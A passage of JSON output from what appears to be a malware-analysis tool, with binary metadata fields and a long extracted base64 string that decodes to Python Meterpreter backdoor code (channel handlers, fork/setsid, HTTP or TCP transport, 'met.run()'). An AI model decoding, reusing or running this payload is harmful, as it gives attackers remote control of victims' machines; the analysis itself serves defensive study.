UTFZfVFlQRV9UUkFOU19DT01NX1RJTUVPVVQpWyd2YWx1ZSddCiAgICAgICAgc2VsZi5zZW5kX3BhY2tldChyZXNwb25zZSArIHRsdl9wYWNrKFRMVl9UWVBFX1JFU1VMVCwgRVJST1JfU1VDQ0VTUykpCiAgICAgICAgaWYgc2Vjb25kczoKICAgICAgICAgICAgc2VsZi5fdHJhbnNwb3J0X3NsZWVwID0gc2Vjb25kcwogICAgICAgIHJldHVybiBFUlJPUl9TVUNDRVNTLCByZXNwb25zZQoKICAgIGRlZiBfY29yZV9jaGFubmVsX29wZW4oc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIGNoYW5uZWxfdHlwZSA9IHBhY2tldF9nZXRfdGx2KHJlcXVlc3QsIFRMVl9UWVBFX0NIQU5ORUxfVFlQRSkKICAgICAgICBoYW5kbGVyID0gJ2NoYW5uZWxfb3Blbl8nICsgY2hhbm5lbF90eXBlWyd2YWx1ZSddCiAgICAgICAgaWYgaGFuZGxlciBub3QgaW4gc2VsZi5leHRlbnNpb25fZnVuY3Rpb25zOgogICAgICAgICAgICBkZWJ1Z19wcmludCgnWy1dIGNvcmVfY2hhbm5lbF9vcGVuIG1pc3NpbmcgaGFuZGxlcjogJyArIGhhbmRsZXIpCiAgICAgICAgICAgIHJldHVybiBlcnJvcl9yZXN1bHQoTm90SW1wbGVtZW50ZWRFcnJvciksIHJlc3BvbnNlCiAgICAgICAgZGVidWdfcHJpbnQoJ1sqXSBjb3JlX2NoYW5uZWxfb3BlbiBkaXNwYXRjaGluZyB0byBoYW5kbGVyOiAnICsgaGFuZGxlcikKICAgICAgICBoYW5kbGVyID0gc2VsZi5leHRlbnNpb25fZnVuY3Rpb25zW2hhbmRsZXJdCiAgICAgICAgcmV0dXJuIGhhbmRsZXIocmVxdWVzdCwgcmVzcG9uc2UpCgogICAgZGVmIF9jb3JlX2NoYW5uZWxfY2xvc2Uoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIGNoYW5uZWxfaWQgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9DSEFOTkVMX0lEKVsndmFsdWUnXQogICAgICAgIGlmIGNoYW5uZWxfaWQgbm90IGluIHNlbGYuY2hhbm5lbHM6CiAgICAgICAgICAgIHJldHVybiBFUlJPUl9GQUlMVVJFLCByZXNwb25zZQogICAgICAgIGNoYW5uZWwgPSBzZWxmLmNoYW5uZWxzW2NoYW5uZWxfaWRdCiAgICAgICAgc3RhdHVzLCByZXNwb25zZSA9IGNoYW5uZWwuY29yZV9jbG9zZShyZXF1ZXN0LCByZXNwb25zZSkKICAgICAgICBpZiBzdGF0dXMgPT0gRVJST1JfU1VDQ0VTUzoKICAgICAgICAgICAgZGVsIHNlbGYuY2hhbm5lbHNbY2hhbm5lbF9pZF0KICAgICAgICAgICAgaWYgY2hhbm5lbF9pZCBpbiBzZWxmLmludGVyYWN0X2NoYW5uZWxzOgogICAgICAgICAgICAgICAgc2VsZi5pbnRlcmFjdF9jaGFubmVscy5yZW1vdmUoY2hhbm5lbF9pZCkKICAgICAgICAgICAgZGVidWdfcHJpbnQoJ1sqXSBjbG9zZWQgYW5kIHJlbW92ZWQgY2hhbm5lbCBpZDogJyArIHN0cihjaGFubmVsX2lkKSkKICAgICAgICByZXR1cm4gc3RhdHVzLCByZXNwb25zZQoKICAgIGRlZiBfY29yZV9jaGFubmVsX2VvZihzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgY2hhbm5lbF9pZCA9IHBhY2tldF9nZXRfdGx2KHJlcXVlc3QsIFRMVl9UWVBFX0NIQU5ORUxfSUQpWyd2YWx1ZSddCiAgICAgICAgaWYgY2hhbm5lbF9pZCBub3QgaW4gc2VsZi5jaGFubmVsczoKICAgICAgICAgICAgcmV0dXJuIEVSUk9SX0ZBSUxVUkUsIHJlc3BvbnNlCiAgICAgICAgY2hhbm5lbCA9IHNlbGYuY2hhbm5lbHNbY2hhbm5lbF9pZF0KICAgICAgICBzdGF0dXMsIHJlc3BvbnNlID0gY2hhbm5lbC5jb3JlX2VvZihyZXF1ZXN0LCByZXNwb25zZSkKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCgogICAgZGVmIF9jb3JlX2NoYW5uZWxfaW50ZXJhY3Qoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIGNoYW5uZWxfaWQgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9DSEFOTkVMX0lEKVsndmFsdWUnXQogICAgICAgIGlmIGNoYW5uZWxfaWQgbm90IGluIHNlbGYuY2hhbm5lbHM6CiAgICAgICAgICAgIHJldHVybiBFUlJPUl9GQUlMVVJFLCByZXNwb25zZQogICAgICAgIGNoYW5uZWwgPSBzZWxmLmNoYW5uZWxzW2NoYW5uZWxfaWRdCiAgICAgICAgdG9nZ2xlID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfQk9PTClbJ3ZhbHVlJ10KICAgICAgICBpZiB0b2dnbGU6CiAgICAgICAgICAgIGlmIGNoYW5uZWxfaWQgaW4gc2VsZi5pbnRlcmFjdF9jaGFubmVsczoKICAgICAgICAgICAgICAgIHNlbGYuaW50ZXJhY3RfY2hhbm5lbHMucmVtb3ZlKGNoYW5uZWxfaWQpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBzZWxmLmludGVyYWN0X2NoYW5uZWxzLmFwcGVuZChjaGFubmVsX2lkKQogICAgICAgIGVsaWYgY2hhbm5lbF9pZCBpbiBzZWxmLmludGVyYWN0X2NoYW5uZWxzOgogICAgICAgICAgICBzZWxmLmludGVyYWN0X2NoYW5uZWxzLnJlbW92ZShjaGFubmVsX2lkKQogICAgICAgIHJldHVybiBFUlJPUl9TVUNDRVNTLCByZXNwb25zZQoKICAgIGRlZiBfY29yZV9jaGFubmVsX3JlYWQoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIGNoYW5uZWxfaWQgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9DSEFOTkVMX0lEKVsndmFsdWUnXQogICAgICAgIGlmIGNoYW5uZWxfaWQgbm90IGluIHNlbGYuY2hhbm5lbHM6CiAgICAgICAgICAgIHJldHVybiBFUlJPUl9GQUlMVVJFLCByZXNwb25zZQogICAgICAgIGNoYW5uZWwgPSBzZWxmLmNoYW5uZWxzW2NoYW5uZWxfaWRdCiAgICAgICAgc3RhdHVzLCByZXNwb25zZSA9IGNoYW5uZWwuY29yZV9yZWFkKHJlcXVlc3QsIHJlc3BvbnNlKQogICAgICAgIGlmIG5vdCBjaGFubmVsLmlzX2FsaXZlKCk6CiAgICAgICAgICAgIHNlbGYuaGFuZGxlX2RlYWRfcmVzb3VyY2VfY2hhbm5lbChjaGFubmVsX2lkKQogICAgICAgIHJldHVybiBzdGF0dXMsIHJlc3BvbnNlCgogICAgZGVmIF9jb3JlX2NoYW5uZWxfd3JpdGUoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIGNoYW5uZWxfaWQgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9DSEFOTkVMX0lEKVsndmFsdWUnXQogICAgICAgIGlmIGNoYW5uZWxfaWQgbm90IGluIHNlbGYuY2hhbm5lbHM6CiAgICAgICAgICAgIHJldHVybiBFUlJPUl9GQUlMVVJFLCByZXNwb25zZQogICAgICAgIGNoYW5uZWwgPSBzZWxmLmNoYW5uZWxzW2NoYW5uZWxfaWRdCiAgICAgICAgc3RhdHVzID0gRVJST1JfRkFJTFVSRQogICAgICAgIGlmIGNoYW5uZWwuaXNfYWxpdmUoKToKICAgICAgICAgICAgc3RhdHVzLCByZXNwb25zZSA9IGNoYW5uZWwuY29yZV93cml0ZShyZXF1ZXN0LCByZXNwb25zZSkKICAgICAgICAjIGV2YWx1YXRlIGNoYW5uZWwuaXNfYWxpdmUoKSB0d2ljZSBiZWNhdXNlIGl0IGNvdWxkIGhhdmUgY2hhbmdlZAogICAgICAgIGlmIG5vdCBjaGFubmVsLmlzX2FsaXZlKCk6CiAgICAgICAgICAgIHNlbGYuaGFuZGxlX2RlYWRfcmVzb3VyY2VfY2hhbm5lbChjaGFubmVsX2lkKQogICAgICAgIHJldHVybiBzdGF0dXMsIHJlc3BvbnNlCgogICAgZGVmIGNyZWF0ZV9yZXNwb25zZShzZWxmLCByZXF1ZXN0KToKICAgICAgICByZXNwb25zZSA9IHN0cnVjdC5wYWNrKCc+SScsIFBBQ0tFVF9UWVBFX1JFU1BPTlNFKQogICAgICAgIG1ldGhvZF90bHYgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9NRVRIT0QpCiAgICAgICAgcmVzcG9uc2UgKz0gdGx2X3BhY2sobWV0aG9kX3RsdikKICAgICAgICByZXNwb25zZSArPSB0bHZfcGFjayhUTFZfVFlQRV9VVUlELCBiaW5hc2NpaS5hMmJfaGV4KGJ5dGVzKFBBWUxPQURfVVVJRCwgJ1VURi04JykpKQoKICAgICAgICBoYW5kbGVyX25hbWUgPSBtZXRob2RfdGx2Wyd2YWx1ZSddCiAgICAgICAgaWYgaGFuZGxlcl9uYW1lIGluIHNlbGYuZXh0ZW5zaW9uX2Z1bmN0aW9uczoKICAgICAgICAgICAgaGFuZGxlciA9IHNlbGYuZXh0ZW5zaW9uX2Z1bmN0aW9uc1toYW5kbGVyX25hbWVdCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGRlYnVnX3ByaW50KCdbKl0gcnVubmluZyBtZXRob2QgJyArIGhhbmRsZXJfbmFtZSkKICAgICAgICAgICAgICAgIHJlc3VsdCA9IGhhbmRsZXIocmVxdWVzdCwgcmVzcG9uc2UpCiAgICAgICAgICAgICAgICBpZiByZXN1bHQgaXMgTm9uZToKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIHJlc3VsdCwgcmVzcG9uc2UgPSByZXN1bHQKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIGRlYnVnX3RyYWNlYmFjaygnWy1dIG1ldGhvZCAnICsgaGFuZGxlcl9uYW1lICsgJyByZXN1bHRlZCBpbiBhbiBlcnJvcicpCiAgICAgICAgICAgICAgICByZXN1bHQgPSBlcnJvcl9yZXN1bHQoKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgaWYgcmVzdWx0ICE9IEVSUk9SX1NVQ0NFU1M6CiAgICAgICAgICAgICAgICAgICAgZGVidWdfcHJpbnQoJ1stXSBtZXRob2QgJyArIGhhbmRsZXJfbmFtZSArICcgcmVzdWx0ZWQgaW4gZXJyb3I6ICMnICsgc3RyKHJlc3VsdCkpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgZGVidWdfcHJpbnQoJ1stXSBtZXRob2QgJyArIGhhbmRsZXJfbmFtZSArICcgd2FzIHJlcXVlc3RlZCBidXQgZG9lcyBub3QgZXhpc3QnKQogICAgICAgICAgICByZXN1bHQgPSBlcnJvcl9yZXN1bHQoTm90SW1wbGVtZW50ZWRFcnJvcikKCiAgICAgICAgcmVxaWRfdGx2ID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfUkVRVUVTVF9JRCkKICAgICAgICBpZiBub3QgcmVxaWRfdGx2OgogICAgICAgICAgICByZXR1cm4KICAgICAgICByZXNwb25zZSArPSB0bHZfcGFjayhyZXFpZF90bHYpCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlICsgdGx2X3BhY2soVExWX1RZUEVfUkVTVUxULCByZXN1bHQpCgpfdHJ5X3RvX2ZvcmsgPSBUUllfVE9fRk9SSyBhbmQgaGFzYXR0cihvcywgJ2ZvcmsnKQppZiBub3QgX3RyeV90b19mb3JrIG9yIChfdHJ5X3RvX2ZvcmsgYW5kIG9zLmZvcmsoKSA9PSAwKToKICAgIGlmIGhhc2F0dHIob3MsICdzZXRzaWQnKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIG9zLnNldHNpZCgpCiAgICAgICAgZXhjZXB0IE9TRXJyb3I6CiAgICAgICAgICAgIHBhc3MKICAgIGlmIEhUVFBfQ09OTkVDVElPTl9VUkwgYW5kIGhhc191cmxsaWI6CiAgICAgICAgdHJhbnNwb3J0ID0gSHR0cFRyYW5zcG9ydChIVFRQX0NPTk5FQ1RJT05fVVJMLCBwcm94eT1IVFRQX1BST1hZLCB1c2VyX2FnZW50PUhUVFBfVVNFUl9BR0VOVCwKICAgICAgICAgICAgICAgIGh0dHBfaG9zdD1IVFRQX0hPU1QsIGh0dHBfcmVmZXJlcj1IVFRQX1JFRkVSRVIsIGh0dHBfY29va2llPUhUVFBfQ09PS0lFKQogICAgZWxzZToKICAgICAgICAjIFBBVENILVNFVFVQLVNUQUdFTEVTUy1UQ1AtU09DS0VUICMKICAgICAgICB0cmFuc3BvcnQgPSBUY3BUcmFuc3BvcnQuZnJvbV9zb2NrZXQocykKICAgIG1ldCA9IFB5dGhvbk1ldGVycHJldGVyKHRyYW5zcG9ydCkKICAgICMgUEFUQ0gtU0VUVVAtVFJBTlNQT1JUUyAjCiAgICBtZXQucnVuKCkK')))": 1
            }
        },
        {
            "plugin": "extractors.meta",
            "version": "0.1",
            "results": {
                "binsz    71986": 1,
                "bits     64": 1,
                "canary   false": 1,
                "crypto   false": 1,
                "endian   little": 1,
                "havecode false": 1,
                "linenum  false": 1,
                "lsyms    false": 1,
                "maxopsz  16": 1,
                "minopsz  1": 1,
                "nx       false": 1,
                "pcalign  0": 1,
                "pic      false": 1,
                "relocs   false": 1,
                "static   true": 1,
                "stripped false": 1,
                "va       false": 1,
                "71986": 1
            }
        }
    ]
}